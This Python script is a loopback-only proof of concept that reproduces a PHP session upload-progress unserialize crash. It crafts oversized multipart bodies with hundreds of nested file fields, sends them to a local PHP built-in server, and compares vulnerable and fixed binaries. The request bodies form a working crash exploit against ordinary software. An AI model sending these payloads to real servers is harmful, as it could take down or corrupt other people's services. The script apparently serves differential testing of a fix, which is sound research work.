#!/usr/bin/env python3
"""Local, loopback-only BG(unserialize) differential crash chain."""

from __future__ import annotations

import argparse
import hashlib
import http.client
import socket
import subprocess
import tempfile
import time
from pathlib import Path

import repro


SID_A = b"codexprobe123456"
SID_B = b"codexprobe123457"
BOUNDARY = repro.BOUNDARY
END = b"--" + BOUNDARY + b"--\r\n"


def empty_file(index: int) -> bytes:
    name = (f"files[R{index:05d}{'K' * 90}]" + "[a]" * 62).encode()
    content_type = b"C" * (103 if index == 0 else 231) if index < 2 else b"application/octet-stream"
    filename = b"A" if index < 2 else b""
    return (b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name +
            b"\"; filename=\"" + filename + b"\"\r\nContent-Type: " + content_type + b"\r\n\r\n")


def tail_file() -> bytes:
    return repro.field(b"lastfile", b"", filename=b"X", content_type=b"application/octet-stream")


def early(sid: bytes, marker: bytes) -> bytes:
    body = repro.make_a1()
    body = body.replace(SID_A, sid, 1)
    body = body.replace(b"k" * 4000, b"k" * 599999 + marker, 1)
    return body


def late() -> bytes:
    body = bytearray()
    body += repro.field(b"PHPSESSID", SID_A)
    for index in range(864):
        body += empty_file(index)
    for index in range(14):
        body += repro.field(f"f{index:04d}".encode().ljust(103, b"x"), b"v" * 8)
    for index in range(20):
        body += repro.field(f"u{index:02d}".encode(), b"U" * 4000)
    body += repro.field(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * 4000)
    body += repro.field(b"nested_t000" + b"[a]" * 27, b"v")
    body += tail_file()
    body += END
    return bytes(body)


def consumer() -> bytes:
    body = bytearray()
    body += repro.field(b"PHPSESSID", SID_B)
    for index in range(700):
        body += empty_file(index)
    for index in range(50):
        body += repro.field(f"b{index:04d}".encode(), b"B" * 8200)
    body += repro.field(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * 2)
    body += tail_file()
    body += END
    return bytes(body)


def get(port: int) -> str:
    connection = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
    try:
        connection.request("GET", "/index.php")
        response = connection.getresponse()
        response.read()
        return f"HTTP {response.status}"
    finally:
        connection.close()


def run(label: str, binary: Path, bodies: dict[str, bytes]) -> None:
    port = repro.free_port()
    docroot = Path(__file__).resolve().parent / "www"
    with tempfile.TemporaryDirectory() as sessions, tempfile.TemporaryFile() as log:
        process = subprocess.Popen(
            [str(binary.resolve(strict=True)), "-n", "-d", "memory_limit=128M", "-d", "post_max_size=8M",
             "-d", "session.upload_progress.enabled=1", "-d", "display_errors=Off",
             "-d", f"session.save_path={sessions}",
             "-S", f"127.0.0.1:{port}", "-t", str(docroot)],
            stdout=log, stderr=subprocess.STDOUT,
        )
        try:
            for _ in range(50):
                if process.poll() is not None:
                    raise RuntimeError(f"{label}: server exited at startup")
                try:
                    with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                        break
                except OSError:
                    time.sleep(0.1)
            else:
                raise RuntimeError(f"{label}: server did not start")
            print(f"{label}:")
            for stage in ("early-a", "get-a", "early-b", "get-b", "late", "consumer"):
                if stage.startswith("get"):
                    result = get(port)
                else:
                    result = repro.request(port, bodies[stage])
                time.sleep(0.1)
                file_a = Path(sessions) / f"sess_{SID_A.decode()}"
                file_b = Path(sessions) / f"sess_{SID_B.decode()}"
                size_a = file_a.stat().st_size if file_a.exists() else 0
                size_b = file_b.stat().st_size if file_b.exists() else 0
                print(f"  {stage}: {result}; worker_exit={process.poll()}; sessions={size_a}/{size_b}")
                if process.poll() is not None:
                    break
        finally:
            if process.poll() is None:
                process.terminate()
            try:
                process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--php-vulnerable", type=Path)
    parser.add_argument("--php-fixed", type=Path)
    args = parser.parse_args()
    bodies = {"early-a": early(SID_A, b"A"), "early-b": early(SID_B, b"B"),
              "late": late(), "consumer": consumer()}
    for name, body in bodies.items():
        if len(body) >= 1_048_576:
            raise RuntimeError(f"{name} exceeds one MiB")
        print(f"{name}: {len(body)} bytes, sha256={hashlib.sha256(body).hexdigest()}")
    if args.php_vulnerable:
        run("vulnerable", args.php_vulnerable, bodies)
    if args.php_fixed:
        run("fixed", args.php_fixed, bodies)


if __name__ == "__main__":
    main()
